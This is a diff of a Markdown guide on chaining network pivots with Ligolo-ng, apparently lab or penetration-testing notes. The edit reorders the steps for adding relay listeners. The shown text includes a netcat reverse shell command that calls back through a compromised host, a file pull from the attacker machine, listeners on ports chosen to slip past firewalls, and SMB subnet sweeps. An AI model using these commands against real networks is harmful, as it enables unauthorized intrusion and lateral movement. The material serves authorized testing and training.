@@ -69,15 +69,7 @@ sudo ip route add 172.16.5.0/24 dev tunnel1
 start --tun tunnel1
 ```
 
-**6. Add a listener on the tunnel, for the next hop**
-
-```
-listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
-```
-
-Opens a listening port **inside** Target 1's network (reachable from hosts in `172.16.5.0/24`) and forwards connections back to the local proxy port. This is what lets a second agent (deeper in the network) dial back in.
-
-**7. Verify reachability**
+**6. Verify reachability**
 
 ```bash
 netexec smb 172.16.5.0/24
@@ -89,15 +81,23 @@ Confirms the route/tunnel works by sweeping SMB across the newly reachable subne
 
 ## 2nd Pivot on 2nd internal range
 
-**1. Run the agent on Target 2, connecting to Target 1's internal IP (not Kali directly)**
+**1. Add a listener on the tunnel, for the next hop**
+
+```
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+```
+
+Opens a listening port **inside** Target 1's network (reachable from hosts in `172.16.5.0/24`) and forwards connections back to the local proxy port. This is what lets a second agent (deeper in the network) dial back in.
+
+**2. Run the agent on Target 2, connecting to Target 1's internal IP (not Kali directly)**
 
 ```powershell
 .\agent.exe -connect 172.16.5.10:11601 -ignore-cert
 ```
 
-Target 2 can't reach Kali directly, it can only reach Target 1, so it dials the listener opened in step 6 above, which proxies the connection back to the Ligolo console.
+Target 2 can't reach Kali directly, it can only reach Target 1, so it dials the listener opened, which proxies the connection back to the Ligolo console.
 
-**2. Select the new agent session and run `autoroute` again**
+**3. Select the new agent session and run `autoroute` again**
 
 ```
 ligolo-ng » session
@@ -118,7 +118,7 @@ sudo ip route add 172.16.6.0/24 dev tunnel2
 start --tun tunnel2
 ```
 
-**3. Add listeners for commonly-whitelisted ports (port forwarding step)**
+**4. Add listeners for commonly-whitelisted ports (port forwarding step)**
 
 ```
 listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
@@ -127,7 +127,7 @@ listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
 
 Opens 443/80 on the Target 2 side of the tunnel and forwards them back to the matching local port on Kali, useful for catching callbacks or serving files, since 80/443 are often allowed through firewalls/AV.
 
-**4. Pull a file from Kali through Target 1's internal IP**
+**5. Pull a file from Kali through Target 1's internal IP**
 
 ```powershell
 wget http://172.16.5.10/file -outfile file
@@ -135,7 +135,7 @@ wget http://172.16.5.10/file -outfile file
 
 Target 2 requests the file from Target 1's internal IP; the listener on `tunnel1` forwards it back to whatever is being hosted on Kali (e.g. `python3 -m http.server`).
 
-**5. Catch a reverse shell from Target 2**
+**6. Catch a reverse shell from Target 2**
 
 ```powershell
 nc64.exe 172.16.5.10 443 -e cmd
@@ -143,7 +143,7 @@ nc64.exe 172.16.5.10 443 -e cmd
 
 Target 2 calls back to Target 1's internal IP on a whitelisted port; the listener relays it to the local `nc` listener on Kali.
 
-**6. Verify reachability on the second subnet**
+**7. Verify reachability on the second subnet**
 
 ```bash
 netexec smb 172.16.6.0/24
